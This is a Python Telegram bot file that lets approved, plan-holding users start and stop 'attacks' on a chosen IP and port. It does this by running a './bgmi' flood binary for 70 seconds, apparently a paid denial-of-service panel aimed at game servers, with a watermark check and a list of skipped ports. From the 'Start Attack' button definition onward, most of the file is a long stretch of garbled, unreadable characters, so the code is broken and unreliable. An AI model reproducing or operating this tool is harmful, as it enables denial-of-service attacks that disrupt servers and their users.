import time
import requests
import logging
from threading import Thread
import json
import hashlib
import os
import telebot
import subprocess
from datetime import datetime, timedelta

# Watermark verification
CREATOR = "This File Is Made By @SahilModzOwner"
BotCode = "fc9dc7b267c90ad8c07501172bc15e0f10b2eb572b088096fb8cc9b196caea97"

def verify():
    current_hash = hashlib.sha256(CREATOR.encode()).hexdigest()
    if current_hash != BotCode:
        raise Exception("File verification failed. Unauthorized modification detected.")

verify()
import hashlib

def verify():
    # Read the watermark text
    with open('developer.txt', 'r') as file:
        watermark_text = file.read().strip()

    # Compute the hash of the watermark
    computed_hash = hashlib.sha256(watermark_text.encode()).hexdigest()

    # Read the stored hash
    with open('attack.txt', 'r') as file:
        stored_hash = file.read().strip()

    # Check if the computed hash matches the stored hash
    if computed_hash != stored_hash:
        raise Exception("This File Is Made By @SahilModzOwner.")
    print("This File Is Made By @SahilModzOwner.")

verify()

# Load configuration
with open('config.json') as config_file:
    config = json.load(config_file)

BOT_TOKEN = config['bot_token']
ADMIN_IDS = config['admin_ids']

bot = telebot.TeleBot(BOT_TOKEN)

# File paths
USERS_FILE = 'users.txt'
USER_ATTACK_FILE = "user_attack_details.json"

def load_users():
    if not os.path.exists(USERS_FILE):
        return []
    users = []
    with open(USERS_FILE, 'r') as f:
        for line in f:
            try:
                user_data = json.loads(line.strip())
                users.append(user_data)
            except json.JSONDecodeError:
                logging.error(f"Invalid JSON format in line: {line}")
    return users

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        for user in users:
            f.write(f"{json.dumps(user)}\n")

# Initialize users
users = load_users()

# Blocked ports
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Load existing attack details from the file
def load_user_attack_data():
    if os.path.exists(USER_ATTACK_FILE):
        with open(USER_ATTACK_FILE, "r") as f:
            return json.load(f)
    return {}

# Save attack details to the file
def save_user_attack_data(data):
    with open(USER_ATTACK_FILE, "w") as f:
        json.dump(data, f)

# Initialize the user attack details
user_attack_details = load_user_attack_data()

# Initialize active attacks dictionary
active_attacks = {}

# Function to check if a user is an admin
def is_user_admin(user_id):
    return user_id in ADMIN_IDS

# Function to check if a user is approved
def check_user_approval(user_id):
    for user in users:
        if user['user_id'] == user_id and user['plan'] > 0:
            return True
    return False

# Send a not approved message
def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED*", parse_mode='Markdown')

# Run attack command synchronously
def run_attack_command_sync(target_ip, target_port, action):
    if action == 1:
        process = subprocess.Popen(["./bgmi", target_ip, str(target_port), "1", "70"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        active_attacks[(target_ip, target_port)] = process.pid
    elif action == 2:
        pid = active_attacks.pop((target_ip, target_port), None)
        if pid:
            try:
                # Kill the process
                subprocess.run(["kill", str(pid)], check=True)
            except subprocess.CalledProcessError as e:
                print(f"Failed to kill process with PID {pid}: {e}")

# Buttons
btn_attack = telebot.types.KeyboardButton("Attack")
btn_start = telebot.types.KeyboardButton("Start Attack :Hq@i`\U};(CEqHjZgQJhV(CRYq{KwJtf\NbK.*dT|d
DZBrKQ/ZAa_u3\_a@dgCgmZ`]AMJa\MmNB|uXacWaCO}
tmDIiqunKOqG[A;\EUv8
j@SL\S`@YcRYq{KwJGZOheVRxaZ+ORw XyKYiCTrwA)TgFe~QgzC3v^kqEgGJ$/+sguXqW}L~@r}G p{GhOXw[0MGi|MvgYdISL@[cAjmEp{GhOXw[Vu|VRg3w,$RvN~@hlhWvxIjCS;E_~VgoR	)
%f[_zol3yOv]WtMkWiehU`qX+GR-onN|`
fFSpCexVczhAcdXjXW O~@tW^D:. %3-umYDLzEqqWcXHbSclhMvgYdIS;E_~VgoRp|Kq _w0-&( 34X`ZCaF0-&(= 34
p]SaF[`@&5MvgYdIS=NHbHY}DEa:_vKD}IWh/&( dqFfA[vwWhVuiPE3)
-HDMVnJkm haY`\XrE_pZfkN1
%3-&( 34
%3-C$X[ErgO%M^|GIhgfOc`Cj@qMVbR&|X p{DqGXfM/( 3
%qGN#VcfS~qYvOQv WhVuiPE=wBdZzL-RcdTO~quhKE`I]h	&zRPmuhODx]J0Hgz\Uc= sKDzNC%HUOg:G`]ErO_RMgfSLvffA[~ITiV;SAcdXjXSLDS~Q!U*wqL%OFcZU{@Yd^SgKIjC[rF^%Hc{DAtq?$3yW2= 34
%3A\-Ki|I`K_vKDLI^`Lh ZE`gKbKuZU`zs{RR=}N,<3-&( 34
vKXwwTbQYiGPa{\`Ji~MI~DamMvgYdIS=KRlQ(aS	4
%3-&(EEgaXk$3-&(= 34
%3IJ}Wi~RDLaY`\E3VPumE u{X%[EvZdK&}DEag
lHf[_~!x[A}3w%#u0&( 34
lH}GN-DvxEOeqNZ[EvZI7/&( 34
%3XbQ({RNwKG`]ErO_%Hc{DAtqfFWgSi	&*yO3uZu\YeM^-PumES3rEp@R=
&( 34
`BEv0-&( 34
%aMI}Jh{R .4Y@=BUdK.SQFgOwWvPumE{4aY`\izLPX*(gLrz%UC`MHVvdVN4IW)`rDSiSfCI.
~[EvZa*Sgd^DLaDqGZ4uG/`gE fgOw_}[}UtgAEwK_vKD`u&( 34
%3JUyumYDLyOv]WtM`@u{VGv:ImOB=A^!tmDP|zY`cIH~@YeXDv)
HODxLUzK!!= 34
`VUvXN-`~kRPg}EkW`_7/&( 34
%BYtOScB(mER|fcsaZUofAcdXjXSLDS~Q&kXM~uDahMG/wB|`hKE`I]hzniYDqX-MY~E[cAu5lrdZwA@v-baDAcdXjXS4uAcnAcdXjXSLGHRAo{VPcfEsKif[_
kmDSrsO,<3-PumEzp
8[v[IlBc&QR|yup]SaSi/&( p|Kqq_w-Hc{DAtqfFWgSi/&( pyNZ^Wa\I-&eRS`uM` BvPN#Vvd^T;= 3SkhgC zgup]Saw[iHofU`qXZGR:0-&( 34HjZ`MTizkmDSrsO-M^r\edA*(
][~%ofCzu[`B"3dKw]SLEUi@;/zAaNjYX40-&( 34X`ZCaF0&(Iu4F`@pE^RUgzCS:4%-&( q{^+]S}Le`@u{VGv<ImOBLA^!$"~NeuFlJpGW`DhlF|fGdZ3}Ih)iGPa{\`
f[_zol	 /dFd@3^l\u6Oa4aGErXJJpmfgOwq_w'*(GAagOZCYwM*hgz\D|cD"<3-&(Rv`_w@<-gkCI|z
8U~Le}Dt|D{#I %3\[Bc|hU`qXZGR3dKr TMwKZd\B`sP( 3dFd@.ScQ.kZDLdKwZEHg$onLvzfCRLX[Qu!.4%KZ`M=/&( wuSv3ATy
eeScuXq]m u-L`([E}<IhJicIHyV/(	3 
`BEv
/&( zr
dMBzGT-;(rdZwA@v &( 34
sOZzLexKra[ .4aOBv\S`@(fXW;=
.BzE_i@j|VwuSvRrQI$(lVTv<+GE|NUHg|	3}L%JWj[36(RL`q
aOBv\S`@(fXW;=aOBv #LugQOayKq-&( fgOwq_}NU-&sU`qXZGR1yDtoRTLaY`\izL-vdVN1.
uBW}/Sgd^DLaDqGZ1{DjaSfz^lB3
[nFc{Dp{_kZ)
p/( 34
%C`MH~gxGE}pp]SawScCi!= 34
%3[[{@Y}DEagp]Sa[/&( 34
%CEtwNh]r(
 u6 P]SaAyDtoRTLaY`\izLG-DvxEOeqN%Y_g@}Igf[cxKkSuGH-^biNSn4NdWE=&(EgO?0^dVgxGR|bO3-&}DEagq?s.axVczF|f
p]SaScs{RR`4CcC`MHVs{RRL}N"s2yDtoRTLaY`\izLg&( 34
vO@vwO~@t{U`qXv<-&( ~gMZZSk\0`*u`qX%UBrZ]hQY}DEaKCaSwAIlUvzXVvp
d@R3Z_{@t|RD3`E%HDvM' 34HjZ`MTizkmDSrsO-M^r\edA*(ZStK^`VB?JlWumhM|pO8	{rZQiJqf	bOwGPj &@VNwxO%Z^vs]gfS c{Xq_}XOy`zXM3`B`C`MHedgC~qYvOQvwRlKbdRR;r_kMIWoAg(ZE`gKbK3E_~VgoRgqRq.LQriTK4= aKP3@[cAjmhAg`KfEi`MNxU.eRS`uM`-e`VTL}N%~MI~DamC{u^+GR-k{P .4HjZ`MTizkmDSrsO-M^r\edA*(pqKvKvFNhW&|_E3`KwISgs]gfS c{Xq_}NeLu(QOayKqsaj-uIZc@1= %3JUytmPI``OwqXvPNRVrmG{uDaBSa W~B*(DAequl^icGHySEu4YdXSLAJRUizC~qYvOQv &(Tam3-&}DEaKCa3E_~VgoRufEhqC`MH#Lb 34
%p@[yzol3yOv]WtMnMg|Iw
%3-LvWGOa`
8[v[IlBc&CEk`v^Zz\$&+scxCqB{MdKv}C qm
v^WpM0-&( 34 %3-onLvzl^icGHy&)
 !. %3-&( q{^+]S}Le`@u{VGv<ImOBLA^!$AYVrxCaP|ZWlQ((gLvuY`S}\_r`R ZD
d@R3XUQ&aY g|O%HYaE[y&h~p3DeWzV10-&( 34
%aMNxWh 34
%-&( guXbKBLAJ!riEGv`uuADg-LvWGOa` %3-( 34
%3~[aLbiCE3`B`F|ZN&( 34
q\O)"-&( 34
%BrZ]hQYxXRg4%GXg NlWamCc{Xq<3-&(EkwOuZEIVx@CzEOa. %3-&( q{^+]S}Le`@u{VGv<ImOBLA^!$AYVrxCaF|ZN-KseUEa:
UBSr[_-@h|RR3u
sOZzLdKrmPEa4Lj\g@_-UizC1= %3-&( aq^p\X-&( 4
%3.UiAE3`B`C[cA&xXRg4^jC`MHRDr|VCxKN`ZWzDI&( 34
p]Saw[yQgk\wq^dGZ`sO~@tW^DN4%BrZ]hQYaG3`KwISgwJbWr!= 34
%3[[{@Y}DEaKKqZWpCeiDriU`qXZOBgIYfzbmCAzxY,$3-&(= 34
%3JUyumYDLyOv]WtMnMg|hIw8
cbrZ]hQ&Ag rzN%~Ya\~DpmS rg%NMgIHj@rW^Pn.QqODtMNRUizC]s6%^Wa[_RHilR4YKwER|_T*( 3qRfKFguFcxCI|z
d]v0-&( 34HjZ`MTizkmDSrsO-M^r\edA*(QRz
`\D|ZbFe}ERvp%UEgZh{**7
W[X3INyDecC|yGd@R3[CcFnzXN|aYiW<wM\-WsfhAg`KfEipGW`DhlhSjzI-ZWaO_yzox guXbKBLXUQ*(VCg}Ek-adXBrx
dMBz^_RDr|VCxg %3"-&aQ rw^lAX3-<(3G^d\B3INyDec= 34
%3ADsfTH3`B`Wg\[nN&xEOpqYv$3-&(GR|wOv].IxGvzXCvgY+~YcMT%~$&BtyC'gIHj@rW^P?4Yq\gIHj@rWGOa`)"
-18}?4YqJYf\~PdxEOpqYv fZx!u|SEafv[TcZUn@u{pZDo,$3-&( @`EwKg@_-uOLOu4^mKa]TcLhoAg`KfE<3-&(Ap`CsKir\NlFm{lguXbKBLAJ!riEGv`uuADgg-&xEOpqYv FzL0-&(RLzr
dMBzGT-;(34	%}B|XlQriTK4
%3.AmC g|O%~W\Jk(VCg}\`qWg\[nNu(SIp`Cj@WaQ0-&( 34ZlJ.[nQo~Rr`^dM]`JbU. CAasOqq_cyDtoRTLdEwZ?tbKc!= 34
%3A\-Uol
*34
%3-&|EY)
%3-&( 34
&}zDV-QnmPa{I`]E-&( 34
%3IxGvzXCvgY+\C} a/Nod[?4Yq\cA^$x*(THvwA8zDfM&( 34
%3MBn@v|SfvZwAUv[I#fgd[EwDXjMS`[WizA`4O?$3-&( 34
%G]jLhoEafEwP1n[dIclT|4AlBZ3XHbFc{D d}^mfZlvUolJ3oOxOPr|XN`Hq@ir\NlFm(
 gqF`LYgNtUc{kvmHjODwjOyQifR`^dM]10oQhWDTrf^%gMVhGi|TjdOv }vQXbDtluUg`Ek@\[Q&ICTrwA%.7^q|yhWef!6rirh^jfoZzsI2]cu|b]wvdnW~yT44Uxq}DfRz@a4kmlfIu2;Woz_~yr"jtL`aIFzzCWsnqlNa_GiHfnsuedhcnw_yLkd^!Bty{!j|CDWc{_C}cu|b]wvOQs{g~uxL+sBhbTCwrxnW)2DoMUeN}dr >oHkMUoLz?05&_jlNq2GuG*e_hcv,}bQhsHP VXsb(a{~OduCDKkx^pst$}bQhsHP7Mobg~j*a,B~E*e_rrY{{a_jC3NoeI}qc%$%2nPodeur&1>`YvaG|F$pHs{YymhN+{B*6up&bqyfzCxHUcIydYmn}NjdGwe_nIoh776%2;*6oshhAcSqMGkSxyLyrYa{~OduC3NoeI}qc"}e]q<O
 6<6&,>-N`fSiM 6<6,>-paCiMk{_<+&a{~OduC5ExyWCcuil#IvwTuBgs0<6&,ihPf}K~|gsIowai>0-tLFfuUqs*,exO``HzNok@xZb<%2;*6<6&,>-%2;*6\>Fji~Y%qNtLys}x&cnyUj|yFfyM<bi,}bRq{HnF$46&,>%2yL~8IyxbSshOvsA~gsIowai0nTdfrG&6MyzecshchwUhBms<dc|rtchsTpVz+W}dmyn$6RDtW${_oegk{RTd|BwFx>Ys{kmpiO8IzSzdUjsY`w~H"OGop}fv~q{YZ~OhWUuUq{gbz%Q`aUzDo? 6&,>yN|(,;*6<6&ex-RjfrPUcIydYmz`Uk:K~Pyw]y8`~q`cpaCi
cr&&,>-%2;*6IyxbSpbHZsVkQe`_xIkim~]bwvFye[{s(ovlH+{B2)*6<6&,>-%2T~WdT6&,>-%2,;*6<6&mn}NjdC|e_ne&1>VIvwT;Eediec~>dR%gU~Qy6Sz6s{g"bJzM-K"66Q%2;*6Sz6hcj-]ubTtUoreiec~m76%2;*6<6&,|bH+aCuGU{_oegk{%Q`aUzDo8Ytwr"wi%0htkfJnypiz-IvwThlyOrr(.7%2;*6_pec6-%2;*6<6tim}SkaC;*4fr4(fqdR-I@9vysH<_B6>vIvwT@e_nIoh9PA)2vwBd,gcuilVu~GuWk<@g`wiP|RrO06Aiec~E*Jd~O|xNuz!Qc/c}T;VysH<h,}Lw}P~GUcIyduQ7%2;*6<6&nqyvwH|gsIowai6`YvaG|F$uR}b(ez!wwUkLde_06vml~YZIF71w}dmhqzR";,;*6_duc|j-y}qCkWcyT<wu,{76%2;*6pyakwc[+wTiLx>\>St~ql|zSzdUjsY`w~H%qIvNkx^&6}ic/;axy[xugj-jKzMnz~yr"shOvsA~|bwTxzc~6nShGuGy+a;ttci_daR<~#^yp&nlb]aqGhWU{_oegk{%Q`aUzDo? 6&,>xO``yrG*+qsujY+tTtNUcIyd(ez%2xKkbeur&1>`YvaG|F$uR}b(ez%2xNnIJ}dr>0hwUhBmshs~x0~Li{R3NknIlzox#<;*\<xix>dOZgU~QUw^qh$k~YwMO
0<6&,>-g}R5Pox^C{cml[`:EsB~ISx:&.4TSp2GiF*xUh6gyjeSw{\~G*bU<cui>yTlaxLg{[rr(&<!usThFU{Uxs;+SlNnvIlM-?0<6&,>-%`CoVxx06&,>dZ%~Cui{^Cfg~j~%.) 6<6&,>-^jfhFdreqsujY-qNzWU^06$&WcJd~OiyWqwhh>kSwGo
*CIy6)nlb]aqGhW**Wyeumyh/0
;SkdIyIkczh"_GiHnyMr1/>-%2;xsNidh-%2DiLkrY}erSs~[%/xNnIJ}drE<a;*5Oshh>yT`2K~Pyw]y6rc>lPi2GkSxyLyr&ymhNv;*pUn6s{l|nPodI&&,>-%2rE*cIyd]+na]k5{;*& 6&,>-%2;*bHe,,>-%2;*6<6&,|bH+aCuGU{_oegk{%IvwT@e_nIoh9P%pTtBnu[obYamj%bGiPoIWsrc19@]wyBtTd16&,>-%2;*sBsvx>yYiwDtW$wJu~c`nhN+SVrfru_lbocp-]v2C!)*6<6&,>-%2;*zU{qoby#Yw`Iil4|}jiz-Hj2U~Mn6Wyeumyhq}nPodgcuilVpaCi|crAk<,ehA';,;*60<6&,|bH+aCuGU{_oegk{%_msRDJn:><D~qlXfsUogsIowai>~YkfoL*wVp6g|nSswB;VysHo8,.2-Ld`U~|gy^y+!AWa}Qu#0?6)cicYw2EtNgwTx6nmpiP``,[AebqsujYZzGuGfsH4uiaslRaa@eaTyd!Q7X`thFdresahilRUktI3NoeI}qc%$%2tTdsHC{cml[`2;^~So6Dcj-tdaYFoxXspirbL`vYZ*Vi}~o`SbX]QuFx40<6&,|bH+aCuGU{_oegk{%Q`aUzDo8Ytwr"wi%}QuFxIWyeumyhfyL~8WyeumyhcmsHOodykacXv/}<BzfHs`c+2-a{UzSzdUjs!Q7X`tzSzdUjsYclRXlaGkSxyLyIs{hwUhBms&&,>-IvwTDJn6<{cml[`<@iLgIOost"wi6%2;@bwNCb,#-Q`aUzDo8Ytwr"wi6%2;@grelwtxm-%ChPkq_2bctj#Ou~Oo#0<6&,wkk}R;JyIOostSiQl|nPodeur/6-%2;*tUh8uipichwUhBms~gxAdX)21mEB]FV^Q[yA87zwHosYaqiY85kzQarUkx!%-%2;*d_hctb%2rE*z_r>eazRLd`Rh
**.,,>-%2;AeboshhA`YvaG|F"uR}bYez!'8ouUkzSx6ecs`]kv}Lx{[h8&Ymh*sVkQe`_<*s{clv;zz[r(&0zlEv,tQ*9^ueg|nSsw'VysHCb20')2VzQyseqybi#*qd`ML}x5&,>-%2iF~cHr,>-dqRrLd6<ukhA}]wfU@W<6&x[`fynPodeur&1>dRq:EvGUf[nbuW/P2;zz[r6;,wcH-qK|zwHhe]>C$ltwFd>YqrY|Hv;%*%yzui>=6%2;GkoI<+&epyfBDSkdNoM5Q7-Uc2J~M"uWxIvmlyO,2&>6_pec,.6%2;Jl6[bocp-824BzfHs`c+$%2;*6L}zohAxRq{J;*>^}bcxw`Y+|Il#6<boa{iYifG3GkoI!rgum$+vGoF"?ueijqQdf2cpxw>352CwPo6^}bcxw`Y+|Il#8^}bc$7#Uv}@tQgwN4?,>-%2;VysHChjq-%inPodeur$6>y]wuCo|e_nIoh2-u~Gu06Jpwh >/Jd~O|xNuz$6>{]i{BDVdbSp:&.n_`aUD@ecTh4<,.p62;*6<cuil~dbV~Mn>OostSwcZj;,;*6<6&{YZgU~Qy>Oost76%2;*6qeaSjhDq2;E(<oost,ey]wuCo|e_nIohc-]ubTtUorkrd>}Pd|`SfwTa6`cl-Gas_h^*r[ee(&<%2~Oys <6%,zdOdbViL|s0<6&,>-%gU~QyM A6;,ExO``}Lx6Oost,wcpaCiP*\<cuilVpaCi|crA6'1>y]wuCo|e_nIohC%2;*6I}`cSk~YwanPodI5,>-%2;Nyqehs~x>0c0NPodgbg~yhHZgU~QU^a6bemlLu`ImFn6[rr&~{{YwfC~yzdci0';*tUh8uipichwUhBms~gxAdX)2KhDUb_db*,nlNvwyvLns;[g~uiSr|2) 5TwhhrhqzC;jZ6[rr&|qH%{HkV~6\nyk,jeY%gU~Q VXsb(a{~OduCDKkx^pst$xxRf/JzNhr[<{cml[`(vFye[{s(x{uH%/;KbN}um+7X`tsBdrVyIgxjl_nMU~WfqsujY,(,;*6YtwrSwi82K~Pyw]y8edylv,;*6Woq&1>oSq<U~MnIWyeumyhfzGo|cr<4V`{lO`2CuWodh~c,jlNbwR;jZ6[rr&|qH%{H;WbI<pi~slH?2FRs*FuNBf.7%2yL~8HyqojhNZ|CcWUeNyfYdcXiwT3Nyq<egz{RUuMVtQ~?0rcj>~]swyrSUfUnb.a{~OduC2 6<6r~g76%2;*6iec~AdX%/vFye[{s(jlbQZgU~Q$^6&,>-%2EsB~ISx6;,shOvsA~
i~[h8oh-%2;*JCfi~j-%ChPkq_2bctj#Ou~Oo#6?6U|rdH%fN~cxJib&ng-OusE~)*6<6&,>%2;*6Sz6jip%UuMVtQ~?=+&>$%2;*6<6&nqyvwH|gsIowai6nTdfyrG&6UxpmrdX%tIiNkb<Fji~Y%wHoFx6Nts&EN-]kvkLxbux&xvhc}TvB~,|_V,NBnQr2)*6<6&,>-%2T~WdT&,>-%2oBxq_hIo|2-Hd`A~WUfUnb&1>dLZbIiW 6<6&,>-6%2;*6?6UmhhqzC;jZ6[rr&|qH%fI;VysHCwrxnWZvCoBczI6&,>-%2ShFxI[hbgouRX`fGrOyMOostSwia%/@Wkd]ybYen!qsT|F~IJsdrQ-%2;*e[jsYymhNZsRoBi}exwrm6xO``yzW~wYwIbijlUia*6<6&,-%2;*tUh8uipichwUhBms~gxAdX)2@9wkd]yb&EN-]kvKLxbowpiz-]v({X~wH{srSw}A?iRzQmsNCfi~jp\'>kBxe_C{ih{0HsTpGeaT;?,>-`jE~S~6l}zsi[Nj`*6<6&,|bH+aCuGU{_oegk{%_msRDJn:>_hzaUa2@tQgwN26V`{lO`2CuWod}6pmrdX%[v;Bdrlytx0/;exYhib>yS%aRzQ~6Nts&mjy]fy,[AebqsujYZzGuGfsH4psb}0PdDB*{_oegk{7hwUhBmshs~x>0%5uoBxb]brm}f!%iYc2NzMnz_CermlycdfRz@a>Wyeumyh?;*bHe,,>-%2;VysHCb,#-Q`aUzDo8\nykSk~Yw<O)*6<6&,>nTdfyrG*+qsujY+qNzW$^&,>-%2rE*xUh6ed{nWZgU~QUwJldizapaCi|cr&&,>-%2;*6IyxbSpbHZsVkQe`_xIkim~]bwxKkbeur/>-%2;*6<dcxkR;*6<6gxjl_nMB~WkVo6;,k~YwMGoWkuQCrcxdPv<A~W"cIydYez$6%2;*6up&mjy]fyyF~wSpe<>-%2;*6<bg~yhHZ{V7~wH{srSnbNq2;B~b[}Yh{y]l~U*6<6&,>-%{@;Jdbhwtk{ycu}To
*T<tjc}fYaMVtQ~e 6&,>-%2;*6<6dcj#O`|BDNoeI}qc$}e]qMO*pLytx>vHd`A~WUfUnb{,w~g~IxHor}xb,}lRk}R;Ao6Oosb,xbN%sRoBi}I24*,nlNvwyvLns;[g~uiSr|2)*6<6&,>-%2;*d_hctb-%2;*6<6,>-%2;*6~yr"mhRaMK~Pyw]y>edyclv
;E(_TubomjdRb2goWkuQ<Yh"0#)2VzQyseqybi#*qd`ML}x5&,>-%2;*6HixYmjy]fyyxLg{[rrYgc_-fGiDobeuf*,jlNbwRDSedN06gojdSk/2)*6<6&,>-%2DtW$e_rrYa{~OduC3@bwNCb >kDfRz@a6ihwtx{iJ|`Wkd]ybYenp~fGiDobelytxc#)2VzQyseqybi#*qd`ML}x5&,>-%2~Oys 6&,>-%2;*tUh8uipichwUhBms~gxAdX)2UL*_j<whh>}SwfhF~8LzcmmhpaC;Wbs]brm}fggRoLd6Ns6uij-EjgT;Wkd]yb&EN-]kvkLxb>?,>-`jE~S~6duc|jdSk2Gho,0<6&,>-%pIo
ysTxIkim~]bwxKkbeur*,x/zd{J~G*bU<ermlydfRz@a,ger~6hx0))6|ixexwbR%fI;P~yJ<bni>lHqsEp)JtUh8kim~]bwysBdrVyd.jkc_8~GvAnwqsujY?2K~Pyw]y8rify8/<p~yJ<WrxnW";,Fl6R}xb`{ROq}VDB~b[}.a{~OduC2 6<6r~g76%2;*6iec~AdX%/vFye[{s(jlbQZgU~Q$^6&,>-%2EsB~ISx6;,shOvsA~
i~[h8oh%2;*6Sz6hcj-_mwEp|e_nIg|nSssJ3VysHCb%$%2;*6<6&{cXZ|Io|kfJnypizRQ`aUzDo>YtwrSwi2;*6<6&,>YqgTu) 6<6&,>-]qfGxHUr_hwo`m-%gU~QUwNhwegAiYqsOwP$q_h>s{clv*6<6&,wkdfRz@aI^ybger~2;*6<6&,>y]wuCo|cf<bg~yhHZbIiW*+}brm}fcawRzJfe0<6&,>-%2;hyN2ecbzRQ`aUzDo>YtwrSwi%tHWefJuxa,_yHdqM;ld6Ahwtk{yclb[!X~wH{srSnbNqo5
(:lwt{RQjvC&GwHwri{p*2;*6<6&,>IkMGoWkuQCuiaslRaMUbMi>N}daijRUu>oBxq_hIvcly%sEoJex.?,>-%2;*6~yr"mhRaMK~Pyw]y>edyclv
;E(WNhweg>^HjbV~G*YT<mrmljYqMOk^0mN}daijRLj`Rf
(:lwt{RQjvC&GwHwri{p*2;*6<sj{76%2;*6<6&,|bH+aCuGU{_oegk{%_msRDJn:>Xi,nHldC;B~b[}&jqxRa<KOowIy6s{-Hmw<p~wHh6Gxjl_n244HpZB|FyJ&aYIg}KqKrFlQriTK=63_uFcxC VlI`^BzGT-Du(R4
%3oJr&DE}puhKE`I]h
e`VTL}N)P1n[dIclT|4YqAF3INyDec
 hg^wS:U$/+ffzIqGY}Nbt}Y g|O%LYgYbKraYU|aYiW<wM\-WsfhB|`,<3-Rna[E3@XpK-&( gfS?$3-&( 34HjZcGVaLhoN|zOZ]B|XYWsm zz^`\@rD=	&|^Mv{_q#0-&( 34O}MSc\H]emGTz{D%OE3M &( 34
%3DUjBofPvfXj\u
xbQ&xXL}DbPrAVhA<(LSgf`K10-&( 34
%gAWhudREc<03^IcmG qqLj\S3Z_yWaYG3`E%O@|A^-Wgx^D3rKlBCaMI/%(zAzz
`@BaQ}JofC*zr
ZqXrE_Rz&5
 4KuhO_}we*( 3`X|<3-&(RfzugAB;0-&(RXpqZq}vQXbDtl~NgqXw[Fg0-&( 34FjIQzF]#LhnX1VEqEgGJ}@b(UY3aY`\1